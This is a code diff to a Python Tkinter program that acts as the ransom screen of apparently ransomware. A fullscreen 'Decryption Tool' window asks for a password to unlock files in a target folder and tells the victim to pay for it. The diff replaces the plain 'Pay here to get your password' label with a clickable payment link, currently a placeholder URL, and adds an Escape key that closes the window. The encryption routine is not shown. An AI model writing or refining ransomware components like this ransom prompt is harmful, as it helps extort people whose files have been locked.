@@ -58,8 +58,13 @@ def get_or_create_user_id() -> str:
 
     return user_id
 
+import webbrowser
+
 # ----- Tkinter GUI -----
 def password_window(user_id: str, target_folder: str):
+    def open_link(url: str):
+        webbrowser.open_new(url)
+
     def on_submit():
         pw = entry.get()
         if not pw:
@@ -79,6 +84,11 @@ def password_window(user_id: str, target_folder: str):
     window.title("Decryption Tool")
     window.attributes("-fullscreen", True)   # Full screen
 
+    # allow ESC to exit fullscreen/close
+    def on_escape(event=None):
+        window.destroy()
+    window.bind("<Escape>", on_escape)
+
     frame = tk.Frame(window, bg="#1e1e1e")
     frame.pack(expand=True, fill="both")
 
@@ -92,11 +102,26 @@ def password_window(user_id: str, target_folder: str):
     tk.Button(frame, text="Submit", command=on_submit,
               font=("Helvetica", 24, "bold"), bg="#007acc", fg="white",
               relief="flat", padx=30, pady=10).pack(pady=40)
-     
-    msg_var_pay = tk.StringVar(value="Pay here to get your password: ")
-    tk.Label(frame, textvariable=msg_var_pay, font=("Helvetica", 20),
-             fg="lightgray", bg="#1e1e1e").pack(pady=20)
 
+    # Inline message + clickable "here" link (same row)
+    inline = tk.Frame(frame, bg="#1e1e1e")
+    inline.pack(pady=10)
+
+    msg_var_pay = tk.StringVar(value="Pay ")
+    tk.Label(inline, textvariable=msg_var_pay, font=("Helvetica", 20),
+             fg="lightgray", bg="#1e1e1e").pack(side="left")
+
+    link = tk.Label(inline, text="here", font=("Helvetica", 20, "underline"),
+                    fg="#1e90ff", bg="#1e1e1e", cursor="hand2")
+    link.pack(side="left", padx=(6,0))
+    link.bind("<Button-1>", lambda e: open_link("https://www.google.com"))
+    link.bind("<Enter>", lambda e: link.config(fg="#63b3ff"))
+    link.bind("<Leave>", lambda e: link.config(fg="#1e90ff"))
+
+    tk.Label(inline, text=" to get your password!", font=("Helvetica", 20),
+             fg="lightgray", bg="#1e1e1e").pack(side="left", padx=(6,0))
+
+    # Status message area
     msg_var = tk.StringVar(value="Please enter your password to unlock files.")
     tk.Label(frame, textvariable=msg_var, font=("Helvetica", 20),
              fg="lightgray", bg="#1e1e1e").pack(pady=20)
@@ -106,6 +131,7 @@ def password_window(user_id: str, target_folder: str):
               relief="flat", padx=20, pady=5).pack(side="bottom", pady=40)
 
     window.mainloop()
+
 
 # ----- Main -----
 if __name__ == "__main__":
